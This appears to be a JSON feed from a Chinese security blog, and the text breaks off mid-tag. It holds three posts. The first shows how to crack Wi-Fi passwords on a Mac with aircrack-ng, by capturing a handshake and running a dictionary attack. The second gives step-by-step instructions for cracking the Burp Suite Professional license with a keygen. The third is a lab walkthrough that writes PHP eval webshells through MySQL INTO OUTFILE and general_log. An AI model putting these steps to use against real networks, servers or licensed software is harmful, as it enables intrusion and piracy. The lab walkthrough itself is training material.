{
    "version": "https://jsonfeed.org/version/1",
    "title": "月のブログ",
    "subtitle": "时光如白驹过隙",
    "icon": "https://mo-onstudy.com/images/favicon.ico",
    "description": "",
    "home_page_url": "https://mo-onstudy.com",
    "items": [
        {
            "id": "https://mo-onstudy.com/2022/01/19/M1mac%E5%AE%89%E8%A3%85aircrack-ng/",
            "url": "https://mo-onstudy.com/2022/01/19/M1mac%E5%AE%89%E8%A3%85aircrack-ng/",
            "title": "使用Mac破解Wi-Fi",
            "date_published": "2022-01-19T08:04:44.000Z",
            "content_html": "<h2 id=\"aircrack-ng安装\"><a class=\"anchor\" href=\"#aircrack-ng安装\">#</a> aircrack-ng 安装</h2>\n<p>brew 安装报错</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># brew 安装</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>brew <span class=\"token function\">install</span> aircrack-ng</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 报错信息</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Error: aircrack-ng: no bottle available<span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>You can try to <span class=\"token function\">install</span> from <span class=\"token builtin class-name\">source</span> with:</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  brew <span class=\"token function\">install</span> --build-from-source aircrack-ng</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Please note building from <span class=\"token builtin class-name\">source</span> is unsupported. You will encounter build</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>failures with some formulae. If you experience any issues please create pull</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>requests instead of asking <span class=\"token keyword\">for</span> <span class=\"token builtin class-name\">help</span> on Homebrew's GitHub, Twitter or any other</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>official channels.</pre></td></tr></table></figure><h2 id=\"解决报错\"><a class=\"anchor\" href=\"#解决报错\">#</a> 解决报错</h2>\n<p>根据 github 中大佬的<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0hvbWVicmV3L2hvbWVicmV3LWNvcmUvcHVsbC83Njk5Mw==\">解决方案</span>，修改<span class=\"kbd red\"> aircrack-ng.rb</span> 文件，文件位置<span class=\"kbd red\"> /opt/homebrew/Library/Taps/homebrew/homebrew-core/Formula/aircrack-ng.rb</span></p>\n<figure class=\"highlight ruby\"><figcaption data-lang=\"ruby\"><span>aircrack-ng.rb links:https://github.com/areese/homebrew-core/blob/5f0518be9014b25ac963593cb5c2d6da68cacafb/Formula/aircrack-ng.rb 链接</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">AircrackNg</span> <span class=\"token operator\">&lt;</span> <span class=\"token constant\">Formula</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  desc <span class=\"token string\">\"Next-generation aircrack with lots of new features\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  homepage <span class=\"token string\">\"https://aircrack-ng.org/\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  url <span class=\"token string\">\"https://download.aircrack-ng.org/aircrack-ng-1.6.tar.gz\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  sha256 <span class=\"token string\">\"4f0bfd486efc6ea7229f7fbc54340ff8b2094a0d73e9f617e0a39f878999a247\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  license all_of<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"GPL-2.0-or-later\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BSD-3-Clause\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"OpenSSL\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  livecheck <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    url <span class=\"token symbol\">:homepage</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    regex<span class=\"token punctuation\">(</span><span class=\"token regex\">/href=.*?aircrack-ng[._-]v?(\\d+(?:\\.\\d+)+)\\.t/i</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  bottle <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    sha256 big_sur<span class=\"token punctuation\">:</span>     <span class=\"token string\">\"8a131a99a89edd127981b9dc2c91df91ba7a03b7c0d6c74521392e1649fa7d09\"</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    sha256 catalina<span class=\"token punctuation\">:</span>    <span class=\"token string\">\"1b5ecf42ef840c108536eac5107cf63c514ca2f3d7e8c4f32e5b301f088729c1\"</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    sha256 mojave<span class=\"token punctuation\">:</span>      <span class=\"token string\">\"e6bbba9c16ac26aaacaad5ac4935100a79cf702ab8fcb35fa9797e806ec003fe\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    sha256 high_sierra<span class=\"token punctuation\">:</span> <span class=\"token string\">\"fad333ea8e2792d88305c22b62549f63900ea32aa3f856de57d6e8d70740cd49\"</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  depends_on <span class=\"token string\">\"autoconf\"</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token symbol\">:build</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  depends_on <span class=\"token string\">\"automake\"</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token symbol\">:build</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  depends_on <span class=\"token string\">\"libtool\"</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token symbol\">:build</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  depends_on <span class=\"token string\">\"pkg-config\"</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token symbol\">:build</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  depends_on <span class=\"token string\">\"openssl@1.1\"</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  depends_on <span class=\"token string\">\"pcre\"</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  depends_on <span class=\"token string\">\"sqlite\"</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token comment\"># Remove root requirement from OUI update script. See:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token comment\"># https://github.com/Homebrew/homebrew/pull/12755</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  patch <span class=\"token symbol\">:DATA</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token keyword\">def</span> <span class=\"token method-definition\"><span class=\"token function\">install</span></span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    system <span class=\"token string\">\"./autogen.sh\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--disable-silent-rules\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                           <span class=\"token string\">\"--disable-dependency-tracking\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                           <span class=\"token string\">\"--prefix=<span class=\"token interpolation\"><span class=\"token delimiter tag\">#&#123;</span>prefix<span class=\"token delimiter tag\">&#125;</span></span>\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                           <span class=\"token string\">\"--with-experimental\"</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token comment\"># On MacOS X, some of the c++ header files #include &lt;version> and the makefile has -I. causing problems</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    on_macos <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>      mv <span class=\"token string\">\"version\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"version.txt\"</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    system <span class=\"token string\">\"make\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"install\"</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  <span class=\"token keyword\">def</span> <span class=\"token method-definition\"><span class=\"token function\">caveats</span></span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token string heredoc-string\"><span class=\"token delimiter symbol\"><span class=\"token punctuation\">&lt;&lt;~</span>EOS</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>      Run `airodump-ng-oui-update` install or update the Airodump-ng OUI file.</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token delimiter symbol\">EOS</span></span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  test <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    system <span class=\"token string\">\"<span class=\"token interpolation\"><span class=\"token delimiter tag\">#&#123;</span>bin<span class=\"token delimiter tag\">&#125;</span></span>/aircrack-ng\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--help\"</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr></table></figure><p>执行安装命令，安装成功</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>brew <span class=\"token function\">install</span> --build-from-source aircrack-ng</pre></td></tr></table></figure><h2 id=\"破解wi-fi密码\"><a class=\"anchor\" href=\"#破解wi-fi密码\">#</a> 破解 Wi-Fi 密码</h2>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># airport 软链接</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">ln</span> -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 查看网卡名称</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">ifconfig</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 扫描 Wi-Fi 列表</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>airport -s</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># SSID 表示 Wi-Fi 名称・BSSID 表示 Wi-Fi 设备的硬件地址</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># RSSI 表示信号强度，值是负数，绝对值越小信号越强</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># CHANNEL 表示 Wi-Fi 信道</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># HT 表示吞吐量模式，一般都为 Y</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># CC 表示国家，中国为 CN</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># SECURITY 表示加密方式</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># 开启网卡的监听模式</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>en0 sniff <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># 3 为信道，需对应要破解的 Wi-Fi 信道</span></pre></td></tr></table></figure><p>等待一段时间，期间需要有新终端连接 Wi-Fi，新开一个终端</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 进入 tmp 文件夹</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>/tmp</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 查看握手包</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>aircrack-ng /tmp/airportSniffG6LoGo.cap</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 选择 handshake 不为 0 的 Wi-Fi</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 使用字典爆破</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>aircrack-ng -w <span class=\"token string\">'字典路径'</span> -b <span class=\"token string\">'Wi-Fi mac地址'</span> <span class=\"token string\">'/tmp/airportSniffXXXX.cap'</span></pre></td></tr></table></figure>",
            "tags": [
                "aircrack-ng"
            ]
        },
        {
            "id": "https://mo-onstudy.com/2022/01/17/Burpsuit%E7%A0%B4%E8%A7%A3/",
            "url": "https://mo-onstudy.com/2022/01/17/Burpsuit%E7%A0%B4%E8%A7%A3/",
            "title": "Burpsuit For Mac 破解流程",
            "date_published": "2022-01-17T08:17:41.000Z",
            "content_html": "<h2 id=\"前期准备\"><a class=\"anchor\" href=\"#前期准备\">#</a> 前期准备</h2>\n<h3 id=\"burpsuit下载\"><a class=\"anchor\" href=\"#burpsuit下载\">#</a> Burpsuit 下载</h3>\n<p>访问<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYnVycA==\"> Burpsuit 官网</span>进入<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYnVycC9yZWxlYXNlcy9wcm9mZXNzaW9uYWwtY29tbXVuaXR5LTIwMjEtMTItMT9yZXF1ZXN0ZWRlZGl0aW9uPXByb2Zlc3Npb25hbA==\">下载页面</span>选择适合版本进行下载并安装</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117163741945.png\" alt=\"image-20220117163741945\" /></p>\n<h3 id=\"破解项目下载\"><a class=\"anchor\" href=\"#破解项目下载\">#</a> 破解项目下载</h3>\n<p>访问<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1Ryb2phbkFaaGVu\"> TrojanAZhen</span>/<a href=\"https://github.com/TrojanAZhen/BurpSuitePro-2.1\"><strong>BurpSuitePro-2.1</strong></a> 下载项目文档</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117163817508.png\" alt=\"image-20220117163817508\" /></p>\n<h3 id=\"jdk下载\"><a class=\"anchor\" href=\"#jdk下载\">#</a> jdk 下载</h3>\n<p>从 <span class=\"kbd red\">Zulu JDK</span> 官方网站下载 <span class=\"kbd red\">JDK</span> 安装包并安装 —<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYXp1bC5jb20vZG93bmxvYWRzLz9wYWNrYWdlPWpkaw==\"> 下载页面</span></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117224646677.png\" alt=\"image-20220117224646677\" /></p>\n<h2 id=\"破解步骤\"><a class=\"anchor\" href=\"#破解步骤\">#</a> 破解步骤</h2>\n<p>桌面使用快捷键 <span class=\"kbd\">shift</span> + <span class=\"kbd\">command</span> + <span class=\"kbd red\">G</span>，前往目录 <span class=\"kbd red\">/Applications/Burp Suite Professional.app/Contents/java/app/</span> ，并将破解项目中两个 jar 包 <span class=\"kbd red\">burp-loader-x-Ai.jar</span> 、 <span class=\"kbd red\">burp-keygen-scz.jar</span> 放到目录中</p>\n<p>在此目录进入终端执行以下命令，执行命令后会打开注册机，同时打开 <span class=\"kbd red\">burpsuit</span> 应用程序，根据以下图示破解</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>java -jar burp-keygen-scz.jar</pre></td></tr></table></figure><p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117222617370.png\" alt=\"image-20220117222617370\" title=\"注册机中可自定义用户名称\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117173119941.png\" alt=\"image-20220117173119941\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117173458552.png\" alt=\"image-20220117173458552\" title=\"填入注册机中的license\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117173556277.png\" alt=\"image-20220117173556277\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117173053218.png\" alt=\"image-20220117173053218\" title=\"Copy request至注册机\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117173737953.png\" alt=\"image-20220117173737953\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117173813598.png\" alt=\"image-20220117173813598\" title=\"从注册中Paste response\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117173833200.png\" alt=\"image-20220117173833200\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117173844958.png\" alt=\"image-20220117173844958\" /></p>\n",
            "tags": [
                "Burp",
                "破解软件"
            ]
        },
        {
            "id": "https://mo-onstudy.com/2022/01/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/",
            "url": "https://mo-onstudy.com/2022/01/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/",
            "title": "红日靶场一",
            "date_published": "2022-01-13T06:49:59.000Z",
            "content_html": "<h2 id=\"环境搭建\"><a class=\"anchor\" href=\"#环境搭建\">#</a> 环境搭建</h2>\n<h3 id=\"修改vmware-fusion网络配置\"><a class=\"anchor\" href=\"#修改vmware-fusion网络配置\">#</a> 修改 VMware Fusion 网络配置</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 修改 VMware Fusion 的网络配置文件</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">vi</span> /Library/Preferences/VMware<span class=\"token punctuation\">\\</span> Fusion/networking</pre></td></tr></table></figure><pre><code class=\"language-networking\">VERSION=1,0\nanswer VNET_1_DHCP no\nanswer VNET_1_DHCP_CFG_HASH F7F79C241EC928D7CA1121B015C2AA4719D12591\nanswer VNET_1_HOSTONLY_NETMASK 255.255.255.0\nanswer VNET_1_HOSTONLY_SUBNET 192.168.52.0\nanswer VNET_1_HOSTONLY_UUID FABDE6B9-8968-40BE-AC6B-9CB97CAD19E0\nanswer VNET_1_VIRTUAL_ADAPTER yes\nanswer VNET_8_DHCP no\nanswer VNET_8_DHCP_CFG_HASH A8C956D502720409073060FB037B694D21771B89\nanswer VNET_8_HOSTONLY_NETMASK 255.255.255.0\nanswer VNET_8_HOSTONLY_SUBNET 192.168.11.0\nanswer VNET_8_HOSTONLY_UUID E4426FB6-0333-4D3F-84AF-B4ED8B73D803\nanswer VNET_8_NAT yes\nanswer VNET_8_VIRTUAL_ADAPTER yes\n</code></pre>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 修改 ip 为 192.168.52.0 网段</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">vi</span> /Library/Preferences/VMware<span class=\"token punctuation\">\\</span> Fusion/vmware1/nat.conf</pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 修改网关为 192.168.11.2</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">vi</span> /Library/Preferences/VMware<span class=\"token punctuation\">\\</span> Fusion/vmware8/nat.conf</pre></td></tr></table></figure><h3 id=\"修改镜像\"><a class=\"anchor\" href=\"#修改镜像\">#</a> 修改镜像</h3>\n<h4 id=\"win7\"><a class=\"anchor\" href=\"#win7\">#</a> win7</h4>\n<p>win7 需新添加一个网络适配器</p>\n<div class=\"tab\" data-id=\"id1\" data-title=\"网络适配器1\">\n<p>vmware 网络适配器 1 选择<span class=\"label success\"> NAT 模式</span></p>\n<p>进入 win7 系统设置对应网络适配器为静态 ip</p>\n<div class=\"note info\">\n<p>可通过断开 / 连接 vmware 网络适配器或网络适配器的 MAC 地址找到对应的网络适配器</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220118233359076.png\" alt=\"image-20220118233359076\" /></p>\n</div>\n</div>\n<div class=\"tab\" data-id=\"id1\" data-title=\"网络适配器2\">\n<p>vmware 网络适配器 2 选择<span class=\"label success\">仅主机模式</span></p>\n<p>进入 win7 系统设置对应网络适配器为静态 ip</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220118233313039.png\" alt=\"image-20220118233313039\" /></p>\n</div>\n<div class=\"tab\" data-id=\"id1\" data-title=\"修改Hosts文件\">\n<pre><code class=\"language-hosts\"># 添加域名解析\n192.168.52.138 owa.god.org\n192.168.52.141 root-tvi862ubeh.god.org\n</code></pre>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220118235247824.png\" alt=\"image-20220118235247824\" /></p>\n</div>\n<p>打开 C 盘 PHPStudy 并开启</p>\n<h3 id=\"win-server-2003\"><a class=\"anchor\" href=\"#win-server-2003\">#</a> win server 2003</h3>\n<p>网络适配器选择<span class=\"label success\">仅主机模式</span></p>\n<h3 id=\"win-server-2008\"><a class=\"anchor\" href=\"#win-server-2008\">#</a> win server 2008</h3>\n<p>网络适配器选择<span class=\"label success\">仅主机模式</span></p>\n<h2 id=\"环境介绍\"><a class=\"anchor\" href=\"#环境介绍\">#</a> 环境介绍</h2>\n<p>攻击机：macOS</p>\n<p>攻击机 IP：192.168.50.171</p>\n<p>目标机：win7</p>\n<p>目标机 IP：192.168.11.123</p>\n<table>\n<thead>\n<tr>\n<th>角色</th>\n<th>系统</th>\n<th>IP</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>攻击机</td>\n<td>macos</td>\n<td>192.168.50.171（en1）、192.168.50.23（en0）</td>\n</tr>\n<tr>\n<td>目标机</td>\n<td>win7</td>\n<td>192.168.11.123（外网）、192.168.52.143（内网）</td>\n</tr>\n<tr>\n<td>域内机</td>\n<td>Win2003</td>\n<td>192.168.52.141（内网）</td>\n</tr>\n<tr>\n<td>域控</td>\n<td>Win2008</td>\n<td>192.168.52.138（内网）</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"目录扫描\"><a class=\"anchor\" href=\"#目录扫描\">#</a> 目录扫描</h2>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python3 dirmap.py -i http://192.168.11.123</pre></td></tr></table></figure><p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427162656117.png\" alt=\"image-20220427162656117\" /></p>\n<p>备份文件下载</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMTEuMTIzL2JlaWZlbi5yYXIlRUYlQkMlOENjb25maWcucGhwJUU0JUI4JUFEJUU2JTlGJUE1JUU3JTlDJThCJUU2JTk1JUIwJUU2JThEJUFFJUU1JUJBJTkzJUU4JUI0JUE2JUU1JThGJUI3JUU1JUFGJTg2JUU3JUEwJTgxJUU0JUI4JUJBcm9vdC9yb290\">http://192.168.11.123/beifen.rar，config.php 中查看数据库账号密码为 root/root</span></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427162814019.png\" alt=\"image-20220427162814019\" /></p>\n<h2 id=\"getshell\"><a class=\"anchor\" href=\"#getshell\">#</a> getshell</h2>\n<h3 id=\"phpmyadmin\"><a class=\"anchor\" href=\"#phpmyadmin\">#</a> phpmyadmin</h3>\n<p>phpmyadmin 登录账号密码：root/root</p>\n<p>执行命令允许攻击机远程连接数据库</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 允许远程连接</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">GRANT</span> <span class=\"token keyword\">ALL</span> <span class=\"token keyword\">PRIVILEGES</span> <span class=\"token keyword\">ON</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span> <span class=\"token keyword\">TO</span> <span class=\"token string\">'root'</span><span class=\"token variable\">@'%'</span> IDENTIFIED <span class=\"token keyword\">BY</span> <span class=\"token string\">'root'</span> <span class=\"token keyword\">WITH</span> <span class=\"token keyword\">GRANT</span> <span class=\"token keyword\">OPTION</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 刷新权限</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>flush <span class=\"token keyword\">privileges</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>可使用第三方软件连接数据库</p>\n<p>查询到账号密码，密码 md5 解密，为 admin/123456</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427163209495.png\" alt=\"image-20220427163209495\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427164622214.png\" alt=\"image-20220427164622214\" /></p>\n<h4 id=\"into-outfile-getshell\"><a class=\"anchor\" href=\"#into-outfile-getshell\">#</a> into outfile getshell</h4>\n<p>利用条件：</p>\n<ul>\n<li>\n<p>对 web 目录需要有写权限能够使用单引号</p>\n</li>\n<li>\n<p>知道绝对路径</p>\n</li>\n<li>\n<p>secure_file_priv 没有具体值</p>\n</li>\n</ul>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">show</span> <span class=\"token keyword\">global</span> variables <span class=\"token operator\">like</span> <span class=\"token string\">'%secure%'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427165323478.png\" alt=\"image-20220427165323478\" /></p>\n<p>secure_file_priv 的值为 NULL，说明不能使用 into outfile 的方式写入 shell</p>\n<p>secure_file_priv 的值为空时，写入 shell</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 查询物理路径</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">select</span> @<span class=\"token variable\">@basedir</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 写入 shell</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token string\">'&lt;?php eval($_POST[cmd]);?>'</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span> <span class=\"token string\">'C:/phpStudy/www/111.php'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h4 id=\"日志getshell\"><a class=\"anchor\" href=\"#日志getshell\">#</a> 日志 getshell</h4>\n<pre><code class=\"language-mysql\"># 开启日志记录\nset global general_log = &quot;ON&quot;;\n# 查看当前日志存放目录\nshow variables like 'general%';\n# 指定日志记录文件\nset global general_log_file = &quot;C:/phpStudy/WWW/shelllog.php&quot;;\n# 执行命令\nSELECT'&lt;?php eval(@$_POST['123']);?&gt;'\n</code></pre>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427170930272.png\" alt=\"image-20220427170930272\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427170947575.png\" alt=\"image-20220427170947575\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427171016485.png\" alt=\"image-20220427171016485\" /></p>\n<p><img 